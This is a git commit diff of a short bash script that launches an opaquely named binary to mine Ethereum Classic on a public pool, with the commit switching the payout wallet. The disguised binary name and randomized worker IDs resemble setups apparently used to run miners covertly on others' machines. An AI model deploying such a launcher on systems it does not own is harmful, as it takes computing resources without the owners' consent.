59ab5e455e9fbaddfb8a87e221e1020b6937fbce
cakcokcakcok <85560209+cakcokcakcok@users.noreply.github.com>
2021-06-08 22:27:05 +0700

    Update fpu.sh

--- fpu.sh
+++ fpu.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=etc.2miners.com:1010
-WALLET=0xa996d73bc49d387ef84b2e9ae2383b5384175075
+WALLET=0x00411dfb5645e326b67560e85fed6322914486c8
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU)
 chmod +x mangresing
 ./mangresing --algo ETCHASH --pool $POOL --user $WALLET.$WORKER 
